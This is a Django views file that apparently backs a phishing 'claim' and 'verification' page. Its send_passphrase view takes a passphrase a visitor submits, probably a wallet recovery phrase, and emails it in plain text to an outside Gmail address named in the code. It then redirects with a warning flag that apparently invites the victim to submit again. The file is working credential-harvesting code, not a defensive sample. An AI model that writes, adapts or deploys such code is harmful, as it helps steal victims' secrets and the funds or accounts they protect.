from django.shortcuts import render,redirect
from django.core.mail import send_mail

def home(request):
    return render(request, 'home.html')

def claim(request):
    show_warning = request.GET.get('warn', '') == '1'
    return render(request, 'verification.html', {'show_warning': show_warning})

def send_passphrase(request):
    if request.method == 'POST':
        passphrase = request.POST.get('passphrase')
        if passphrase:
            send_mail(
                subject="New Passphrase",
                message=passphrase,
                from_email='buyerpi24@gmail.com',
                recipient_list=['gthakral743@gmail.com'],
                fail_silently=False,
            )
            return redirect('/claim/?warn=1')  # pass flag in URL
    return redirect('claim')